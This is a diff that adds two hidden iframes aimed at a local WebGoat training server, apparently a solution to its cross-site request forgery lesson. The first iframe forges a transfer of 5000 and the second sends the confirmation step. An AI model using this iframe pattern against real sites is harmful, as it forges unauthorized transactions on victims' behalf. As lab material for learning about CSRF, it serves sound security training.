@@ -1,0 +1,6 @@
+<iframe id="iframe1" src="http://localhost:8090/WebGoat/attack?Screen=2094584595&menu=900&transfer=5000" width="100" height="100"></iframe>
+
+<iframe id="iframe2" src="http://localhost:8090/WebGoat/attack?transfer=CONFIRMED#attack/2094584595/900" width="100" height="100"></iframe>
+
+
+
